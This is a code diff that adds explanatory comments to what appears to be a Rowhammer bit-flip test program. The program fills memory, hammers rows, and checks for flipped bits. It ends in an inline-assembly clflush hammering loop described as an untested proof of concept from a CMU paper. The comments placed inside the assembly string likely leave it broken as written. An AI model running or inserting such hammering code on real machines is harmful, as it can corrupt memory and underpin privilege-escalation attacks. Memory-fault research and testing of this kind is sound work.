@@ -64,7 +64,7 @@ int main()
      memset(g_mem, 0xff, mem_size);
 
      //loop forever
-
+      // this is more complicated double sided rowHammer attack
      while(true){
          uint32_t *addrs[8];
          uint32_t sum = 0;
@@ -84,6 +84,8 @@ int main()
       int errors = 0;
       for (ptr = (uint64_t *) g_mem; ptr < end; ptr++) {
          uint64_t got = *ptr;
+
+         //check for flipped bits (1's)
          if (got != ~(uint64_t) 0) {
             printf("error at %p: got 0x%" PRIx64 "\n", ptr, got);
             errors++;
@@ -91,13 +93,14 @@ int main()
       }
      }
 
+     //proof of concept attack demonstrated in CMU paper.
 	 // inline assembly, have NOT tested this.
    	asm volatile("mainForever:
-   			mov (X), %eax
-   			mov (Y), %ebx
-   			clflush (X)
-   			clflush (Y)
-   			mfence
+   			mov (X), %eax //move value x into register a
+   			mov (Y), %ebx // move value y into register b
+   			clflush (X) //flush x out of the cache
+   			clflush (Y) //flush y out of the cache
+   			mfence // make sure to wait for x and y to be fully evicted from cache
    			jmp mainForever");
 
 
